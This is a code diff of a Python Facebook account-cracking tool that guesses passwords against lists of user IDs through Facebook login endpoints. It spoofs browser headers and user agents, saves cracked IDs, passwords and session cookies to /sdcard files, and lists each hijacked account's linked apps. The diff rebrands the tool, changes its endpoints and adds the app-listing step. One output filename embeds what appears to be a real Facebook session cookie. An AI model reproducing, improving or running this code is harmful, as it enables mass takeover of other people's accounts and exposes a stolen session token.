@@ -19,7 +19,6 @@ import requests,bs4,json,sys,random,datetime,time,re,subprocess,platform
 from bs4 import BeautifulSoup as sop
 from concurrent.futures import ThreadPoolExecutor as tred
 import zlib
-from bs4 import BeautifulSoup as bxx
 from time import sleep
 import os,sys,time,json,random,re,string,platform,base64,platform
 try:
@@ -45,6 +44,31 @@ except ModuleNotFoundError:
 	print('\n Installing missing modules ...')
 	os.system('pip install requests bs4 futures==2 > /dev/null')
 	os.system('python MUZZI.py')
+	
+def cek_apk(session,coki):
+	w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text
+	sop = BeautifulSoup(w,"html.parser")
+	x = sop.find("form",method="post")
+	game = [i.text for i in x.find_all("h3")]
+	if len(game)==0:
+		print(f"\r{N}[{M}!{N}] SORRY THERE IS NO ACTIVE APK")
+	else:
+		print("")
+		print(f'\r{so}YOUR ACTIVE APPLICATION DETAILS :'%(H))
+		for i in range(len(game)):
+			print("%s%s. %s%s"%(H,i+1,game[i].replace("ACTIVE"," ACTIVE"),N))
+	w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":coki}).text
+	sop = BeautifulSoup(w,"html.parser")
+	x = sop.find("form",method="post")
+	game = [i.text for i in x.find_all("h3")]
+	if len(game)==0:
+		print(f"\r{N}[{M}!{N}] SORRY THERE IS NO EXPIRED APK")
+	else:
+		print(f'\r{so}YOUR EXPIRED APPLICATION DETAILS :'%(M))
+		for i in range(len(game)):
+			print("%s%s. %s%s"%(K,i+1,game[i].replace("Expired"," Expired"),N))
+			
+
 ugen = []
 for xd in range(5000):
 	aa='Mozilla/5.0 (Linux; U; Android'
@@ -157,70 +181,22 @@ def uaku():
 		ua=open('.bbnew.txt','r').read().splitlines()
 
 
-syed =['Mozilla/5.0 (Linux; arm; Android 11; SM-T510) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 YaApp_Android/23.54/apad YaSearchBrowser/23.54/apad BroPP/1.0 SA/3 Mobile Safari/537.36',
-'Mozilla/5.0 (Linux; Android 11; SM-A202F Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.5735.130 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/423.0.0.21.64',
-'Mozilla/5.0 (Linux; Android 8.0.0; SM-G955U Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Mobile Safari/537.36 Edg/115.0.0.0',
-'Mozilla/5.0 (Linux; Android 11; SM-A515F Build/RP1A.200720.012) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.5735.196 Mobile Safari/537.36 GNews Android/2022146282',
-'Mozilla/5.0 (Linux; Android 9; ASUS_X00QD Build/PPR1.180610.009; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/115.0.5790.127 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/424.0.0.21.75',
-'Mozilla/5.0 (Linux; Android 9; SM-G960F Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/115.0.5790.127 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/424.0.0.21.75',
-'Mozilla/5.0 (Linux; Android 8.1.0; DUB-LX1 Build/HUAWEIDUB-LX1; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/422.0.0.26.76',
-'Mozilla/5.0 (Linux; arm; Android 11; SM-T510) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 YaApp_Android/23.54/apad YaSearchBrowser/23.54/apad BroPP/1.0 SA/3 Mobile Safari/537.36',
-'Mozilla/5.0 (Linux; Android 12; SM-G973F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.5735.226 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/424.0.0.21.75',
-'Mozilla/5.0 (Linux; arm; Android 11; SM-T510) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 YaApp_Android/23.54/apad YaSearchBrowser/23.54/apad BroPP/1.0 SA/3 Mobile Safari/537.36',]
 
-#---------------------[APPLICATION CHECKER]---------------------#
-def cek_apk(session,coki):
-    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text
-    sop = BeautifulSoup(w,"html.parser")
-    x = sop.find("form",method="post")
-    game = [i.text for i in x.find_all("h3")]
-    if len(game)==0:
-        print(f'\r\x1b[38;5;46m[\x1b[38;5;196m!\x1b[38;5;46m] \x1b[38;5;196mSorry there is no Active  Apk  ')
-    else:
-        print(f'\r[🎮] \x1b[38;5;46m ☆ Your Active Apps ☆     :{WHITE}')
-        for i in range(len(game)):
-            print(f"\r[%s%s] %s%s"%(N,i+1,game[i].replace("Ditambahkan pada"," Ditambahkan pada"),N))
-            #created by hbf team(owner) Hamii
-    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":coki}).text
-    sop = BeautifulSoup(w,"html.parser")
-    x = sop.find("form",method="post")
-    game = [i.text for i in x.find_all("h3")]
-    if len(game)==0:
-        print(f'\r\x1b[38;5;46m[\x1b[38;5;196m!\x1b[38;5;46m] \x1b[38;5;196mSorry there is no Expired Apk{WHITE}')
-        print(54*'-')
-    else:
-        print(f'\r[🎮] \x1b[38;5;196m ◇ Your Expired Apps ◇    :{WHITE}')
-        for i in range(len(game)):
-            print(f"\r[%s%s] %s%s"%(N,i+1,game[i].replace("Kedaluwarsa"," Kedaluwarsa"),N))
-        else:
-            print(57*'-')
-            
-#-------Lock-Checker------#
-def lock_check(uid):
-    sessionx=requests.Session()
-    urlx=f'https://www.facebook.com/p/{uid}'
-    req=bxx(sessionx.get(urlx).content,'html.parser')
-    tx=req.find('title').text
-    if tx =='Facebook':
-        return('LOCK')
-    else:
-        return('LIVE')
-
- 
-
+#-------------logo-----------------#
 logo=("""\033[1;32m
-__   __  __   __  _______  _______  __   __  __   __  ___   ___     
-|  |_|  ||  | |  ||       ||   _   ||  |_|  ||  |_|  ||   | |   |    
-|       ||  | |  ||____   ||  |_|  ||       ||       ||   | |   |    
-|       ||  |_|  | ____|  ||       ||       ||       ||   | |   |    
-|       ||       || ______||       ||       ||       ||   | |   |___ 
-| ||_|| ||       || |_____ |   _   || ||_|| || ||_|| ||   | |       |
-|_|   |_||_______||_______||__| |__||_|   |_||_|   |_||___| |_______|
+\x1b[1;95m ████████  ______ _____ _____  _   __ ___________  
+\x1b[38;5;46m    ██    | ___ \_   _/  __ \| | / /|  ___| ___ \ 
+\x1b[1;91m    ██    |    /  | | | |    |    \ |  __||    /  
+\x1b[1;93m    ██    | |\ \ _| |_| \__/\| |\  \| |___| |\ \  
+\x1b[1;95m    ██    \_| \_|\___/ \____/\_| \_/\____/\_| \_| 
+
 \033[1;93m--------------------------------------------------
-\033[1;37m[-] OWNER     :\033[1;32m MUZZI TRICKER
-\033[1;37m[-] FACEBOOK    :\033[1;32m MUZAMMIL HUSSAIN
-\033[1;37m[-] VERSION   :\033[1;32m 1.0
-\033[1;37m[-] STATUS    :\033[1;32m Paid
+\x1b[1;91m[𝙅𝙐𝙎𝙏 𝙁𝙀𝙀𝙇 𝙏𝙃𝙀 𝙋𝙊𝙒𝙀𝙍 𝙊𝙁 𝙏𝙍𝙄𝘾𝙆𝙀𝙍 👿😀🤫]
+\033[1;93m--------------------------------------------------
+\x1b[1;93m[-] OWNER     :\033[1;32m ❥✴𓆩𝙏𝙍𝙄𝘾𝙆𝙀𝙍𓆪♥✯𓄂
+\x1b[1;95m[-] FACEBOOK  :\033[1;32m ⟨ˌ𝐓Ɽ𝐈𝐂̧͜͡𝐊Ɜ͜Ɽˈ⟩爾⸙ 🥵👿
+\033[1;37m[-] VERSION   :\033[1;32m 120.1
+\x1b[1;93m[-] STATUS    :\033[1;32m Paid
 --------------------------------------------------""")
 def linex():
 	print('\033[0;97m------------------------------------------------')
@@ -236,10 +212,10 @@ def fia():
 			print(logo)
 			print('\033[1;32m>>> Legend :\x1b[1;97m  ')
 			linex()
-			print('[1] File Clone\n[2] Random Clone\n[3] BD Clone\n[0] Exit')
+			print('[1] File Clone\n[2] Random Clone\n[0] Exit')
 			linex()
 			xd=input('[*] Choose an option: ')
-			if xd in ['1','01','02']:
+			if xd in ['1','01']:
 				os.system('clear')
 				print(logo)
 				print('Example : /sdcard/MUZZI.txt')
@@ -517,7 +493,7 @@ def bd():
 	uid=[]
 	os.system('clear')
 	print(logo)
-	print('[√] EXAMPLE : 017,018,019,016,.ETC')
+	print('[√] EXAMPLE : 088***,88***,88****,88****,.ETC')
 	linex()
 	kode = input('[+]\033[0;92m PUT YOUR SIM CODE : ')
 	os.system('clear')
@@ -554,10 +530,10 @@ def fcrack(uid,pwx,tl):
 	try:
 		for ps in pwx:
 			session = requests.Session()
-			sys.stdout.write(f'\r [\033[0;92mMUZZI\033[0;92m] %s|OK:-%s \r'%(loop,len(oks))),
+			sys.stdout.write(f'\r [\033[0;92m⟨ˌ𝐓Ɽ𝐈𝐂̧͜͡𝐊Ɜ͜Ɽˈ⟩爾⸙ 🥵👿\033[0;92m] %s|OK:-%s \r'%(loop,len(oks))),
 			sys.stdout.flush()
 			ua = random.choice(ugen)
-			free_fb = session.get('https://mbasic.facebook.com').text
+			free_fb = session.get('https://free.facebook.com').text
 			log_data = {
 				"lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
 			"jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
@@ -568,42 +544,49 @@ def fcrack(uid,pwx,tl):
 			"email":uid,
 			"pass":ps,
 			"login":"Log In"}
-			header_freefb = {'authority': 'x.facebook.com',
-    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-    'accept-language': 'en-US,en;q=0.9',
-    'cache-control': 'max-age=0',
-    # 'cookie': 'datr=7cUHZT55wXX1t8sp0_YBjZFt; sb=7cUHZTHNBDM_O1Byoq_IlqIi; m_pixel_ratio=2; wd=360x676; fr=0TW7qD2i7wDszsLqA..BlB8Xt.ZQ.AAA.0.0.BlB8YD.AWWMJ7iBZBs',
-    'dpr': '2',
-    'sec-ch-prefers-color-scheme': 'dark',
-    'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
-    'sec-ch-ua-full-version-list': '"Not)A;Brand";v="24.0.0.0", "Chromium";v="116.0.5845.72"',
-    'sec-ch-ua-mobile': '?1',
-    'sec-ch-ua-model': '"TECNO LD7"',
-    'sec-ch-ua-platform': '"Android"',
-    'sec-ch-ua-platform-version': '"10.0.0"',
-    'sec-fetch-dest': 'document',
-    'sec-fetch-mode': 'navigate',
-    'sec-fetch-site': 'none',
-    'sec-fetch-user': '?1',
-            'user-agent': ua}
+			header_freefb = {'authority': 'm.alpha.facebook.com',
+            'method': 'GET',
+            'path': 'https://m.alpha.facebook.com/?_rdc=1&_rdr',
+            'scheme': 'https',
+			'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+ 		   'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
+  		  'cache-control': 'max-age=0',
+    		'dpr': '1.8000000715255737',
+   		 'sec-ch-prefers-color-scheme': 'light',
+ 		   'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
+		    'sec-ch-ua-full-version-list': '"Not_A Brand";v="8.0.0.0", "Chromium";v="120.0.6099.116"',
+ 		   'sec-ch-ua-mobile': '?1',
+  		  'sec-ch-ua-model': '"M2006C3MII"',
+   		 'sec-ch-ua-platform': '"Android"',
+    		'sec-ch-ua-platform-version': '"10.0.0"',
+ 		   'sec-fetch-dest': 'document',
+    		'sec-fetch-mode': 'navigate',
+    		'sec-fetch-site': 'none',
+  		  'sec-fetch-user': '?1',
+  		  'upgrade-insecure-requests': '1',
+  		  'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36'
+  								 'Mozilla/5.0 (X11; Linux x86_64; rv:123.0) Gecko/20100101 Firefox/123.0'
+  								 'Mozilla/5.0 (Linux; Android 12; SM-G975F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/122.0.6261.88 Mobile Safari/537.36 Instagram 321.0.0.39.106 Android (31/12; 420dpi; 1080x2047; samsung; SM-G975F; beyond2; exynos'
+  								 'Mozilla/5.0 (Linux; Android 10; M2006C3MNG Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/122.0.6261.88 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/453.0.0.40.107;]',}
 			lo = session.post('https://x.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=log_data,headers=header_freefb).text
 			log_cookies=session.cookies.get_dict().keys()
 			#print(iid+'|'+pws+'|'+str(log_cookies))
-			if 'u_user' in log_cookies:
+			if 'c_user' in log_cookies:
 				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
-				uid = coki[151:166]
+				cid = coki[151:166]
+				print('\x1b[1;92m[⟨ˌ𝐓Ɽ𝐈𝐂̧͜͡𝐊Ɜ͜Ɽˈ⟩爾⸙ 🥵👿-OK] '+str(cid)+' | '+ps+'\033[1;97m')
+				open('/sdcard/⟨ˌ𝐓Ɽ𝐈𝐂̧͜͡𝐊Ɜ͜Ɽˈ⟩爾⸙-rnd-OK.txt','a').write(str(cid)+'|'+ps+'\n')
 				print('\033[1;32m [COOKIES] '+coki)
-				print('\x1b[1;92m[MUZZI-XD-OK] '+uid+' | '+ps+'\033[0;97m')
-				open('cp.txt', 'a').write(uid+' | '+ps+'\n')
-				oks.append(uid)
+				open('/sdcard/⟨ˌ𝐓Ɽ𝐈𝐂̧͜͡𝐊Ɜ͜Ɽˈ⟩爾⸙-rnd-COOKIE.txt','a').write(str(cid)+'|'+ps+'\n')
+				oks.append(cid)
+				cek_apk(session,coki)
 				break
 			elif 'checkpoint' in log_cookies:
 				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
-				uid = coki[141:156]
-				print('\033[1;32m [COOKIES] '+coki)
-				print('\33[38;5;208m[MUZZI-XD-CP] '+uid+' | '+ps+'\033[0;92m')
-				open('ok.txt', 'a').write(uid+' | '+ps+'\n')
-				cps.append(uid)
+				cid = coki[141:156]
+				print('\33[38;5;208m[⟨ˌ𝐓Ɽ𝐈𝐂̧͜͡𝐊Ɜ͜Ɽˈ⟩爾⸙ 🥵👿-CP] '+str(cid)+' | '+ps+'\033[1;97m')
+				open('/sdcard/⟨ˌ𝐓Ɽ𝐈𝐂̧͜͡𝐊Ɜ͜Ɽˈ⟩爾⸙-rnd-CPdatr=Iy_tZciWywxxukDSjMlcVj5l;fr=0GcucHl4PZ8kQYtsN.AWV75qjRR6kAawsJI6HyiNMKo4A.Bl7S8j..AAA.0.0.Bl7S8l.AWVa4rm1diQ;sb=Iy_tZUBjY09WdvMej4w8V9v4;c_user=100012737915511;xs=8%3A5pY8iBc1LKQefw%3A2%3A1710042919%3A-1%3A5948.txt','a').write(str(cid)+'|'+ps+'\n')
+				cps.append(cid)
 				break
 			else:
 				continue
@@ -611,4 +594,5 @@ def fcrack(uid,pwx,tl):
 	except:
 		pass
 
+        
 fia()
